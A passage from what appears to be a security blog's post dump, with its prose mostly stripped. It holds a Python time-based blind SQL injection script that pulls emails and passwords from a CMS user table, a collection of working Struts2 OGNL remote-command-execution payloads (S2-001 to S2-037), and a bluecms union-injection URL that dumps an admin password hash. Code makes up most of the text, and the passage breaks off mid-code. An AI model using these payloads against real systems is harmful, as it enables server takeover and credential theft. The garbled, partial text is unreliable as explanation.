&#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        total_res=&quot;&quot;</span><br><span class="line">        for i in range(1,self.len+1):#</span><br><span class="line">            len = 0</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                if flag == &quot;0&quot;:</span><br><span class="line">                    len = j</span><br><span class="line">                    break</span><br><span class="line">            # print &quot;len:&quot;+str(len)</span><br><span class="line">            res = &quot;&quot;</span><br><span class="line">            for k in range(1, len + 1):</span><br><span class="line">                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                res += flag</span><br><span class="line">                # print res</span><br><span class="line">            total_res+=chr(int(res,2))</span><br><span class="line">            pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res)</span><br><span class="line">        return total_res</span><br><span class="line"></span><br><span class="line">    def send(self,cookie):</span><br><span class="line">        headers=&#123;&quot;Cookie&quot;:cookie&#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(self.url, headers=headers,timeout=4)</span><br><span class="line">            return &quot;1&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">def pprint(flag,content):</span><br><span class="line">    print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \</span><br><span class="line">        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;)</span><br><span class="line">    pprint(&quot;*&quot;,&quot;program start&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;program done&quot;)</span><br></pre></td></tr></table></figure><p>ps:DMT_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITYStruts2</title>
      <link href="2017/01/13/old-old-Struts2-history-payload/"/>
      <url>2017/01/13/old-old-Struts2-history-payload/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Struts2PoCPoC</p><a id="more"></a><ul><li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-xxx" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-xxx</a></li><li><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-009</a></li></ul><h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><p><br>github<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a><br>update:2017/1/16 <a href="https://github.com/0kami/Struts2Environment/" target="_blank" rel="noopener"></a></p><h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><pre><code>2.0.0 - 2.0.8https://struts.apache.org/docs/s2-001.html</code></pre><blockquote><p> OGNL  %{value}  %{value}  OGNL  Payload </p></blockquote><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-005"><a href="#Struts2-S2-005" class="headerlink" title="Struts2 S2-005"></a>Struts2 S2-005</h2><pre><code>: 2.0.0 - 2.1.8.1: http://struts.apache.org/docs/s2-005.html</code></pre><blockquote><p>struts2S2-003(: Struts 2.0.12)struts2httpongl(java)ongl#strutsstruts#unicode(\u0023)8(\43)S2-003()OGNL2S2-003</p></blockquote><p><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">LittleHann</a></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</span><br></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure><p>2PoCk8teamPoC</p><h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><pre><code>: 2.0.0 - 2.3.1.1: https://struts.apache.org/docs/s2-009.html</code></pre><p>S2-003S2-005OGNL(1)(2),1OGNL009test=(some OGNL )(1)&amp;z[(test)(1)]=true<br>z[(test)(1)]=true,struts2(test)(1)test</p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>ps:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</span><br></pre></td></tr></table></figure><p><code>person/new-person.action</code></p><h4 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><pre><code>: 2.0.0 - 2.3.13: https://cwiki.apache.org/confluence/display/WW/S2-012</code></pre><p>Action  Result  ${param_name} ,strutsOGNL</p><h3 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</span><br></pre></td></tr></table></figure><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><pre><code>: 2.0.0 - 2.3.14.1: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014</code></pre><p><code>s:url</code><code>s:a</code>include</p><ol><li>none - include no parameters in the URL (default)</li><li>get - include only GET parameters in the URL</li><li>all - include both GET and POST parameters in the URL</li></ol><p>getallOGNL</p><h3 id="PoC-4"><a href="#PoC-4" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><pre><code>: 2.0.0 - 2.3.15: https://struts.apache.org/docs/s2-016.html</code></pre><blockquote><p>DefaultActionMapper  action:redirect:  redirectAction:  OGNL  Struts2  Action  OGNL </p></blockquote><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a></p><h3 id="PoC-5"><a href="#PoC-5" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-4"><a href="#web-4" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</span><br></pre></td></tr></table></figure><p>PoCnamewaf</p><h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><pre><code>: 2.0.0 - 2.3.15.1: https://cwiki.apache.org/confluence/display/WW/S2-019</code></pre><p><code>debug=command&amp;expression=</code>OGNL</p><h3 id="PoC-6"><a href="#PoC-6" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</span><br></pre></td></tr></table></figure><h4 id="-5"><a href="#-5" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><pre><code>: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3): https://struts.apache.org/docs/s2-032.html</code></pre><blockquote><p> Struts2 DMI  True  method:<name> Action  public DMI Dynamic Method Invocation DMI  Strtus2  name  OGNL  - Apache Struts2 s2-032</name></p></blockquote><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a></p><h3 id="PoC-7"><a href="#PoC-7" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-5"><a href="#web-5" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="-6"><a href="#-6" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><pre><code>: 2.3.20 - 2.3.28.1: http://struts.apache.org/docs/s2-037.html</code></pre><blockquote><p>S2-032/033DefaultActionInvocation.javainvokeActionmethodNamegetValueOngl</p></blockquote><p><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438" target="_blank" rel="noopener">nsfocus</a>%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)</p><h3 id="PoC-8"><a href="#PoC-8" class="headerlink" title="PoC"></a>PoC</h3><h4 id="web-6"><a href="#web-6" class="headerlink" title="web"></a>web</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="-7"><a href="#-7" class="headerlink" title=""></a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Struts2java</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewbluecms v1.6 Sql Injection </title>
      <link href="2017/01/11/old-old-bluecms-v1-6-Sql-Injection/"/>
      <url>2017/01/11/old-old-bluecms-v1-6-Sql-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>bluecmscms</p><a id="more"></a><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>common.inc.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deep_addslashes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">if(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3</p><ol><li></li><li>cmsgb2312</li><li>httpipreffer</li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>grep$_GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure><p>ad_js.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Error!&apos;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure><p>getone</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">    $query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ad_id,ad_contentunionpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>ps:cmssql</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>bluecmsmysql.class.php,gbkgbkcmsgrep</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>user.php<br>admin/login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;;</span><br><span class="line"> $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;;</span><br><span class="line"> $remember = isset($_POST) ? 